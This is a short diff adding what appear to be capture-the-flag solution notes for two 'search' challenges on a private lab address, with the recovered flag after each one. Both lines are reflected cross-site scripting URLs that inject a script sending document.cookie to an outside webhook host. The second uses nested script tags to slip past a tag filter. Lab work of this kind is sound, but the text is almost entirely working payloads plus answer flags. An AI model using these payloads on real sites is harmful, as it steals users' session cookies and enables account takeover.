@@ -1,0 +1,7 @@
+search v1
+http://10.20.12.187:4007/?keyword=<script>fetch('https://spicy-answer-58.webhook.cool?data=' + document.cookie)</script>
+flag{c7a39db946b5ca11a0adc77baddbd29a}
+
+search v2
+http://10.20.12.187:4008/?keyword=<<script>script>fetch('https://spicy-answer-58.webhook.cool?data=' + document.cookie)<<script>/script>
+flag{cac8e843d040b78ef8817d217fb4e418}
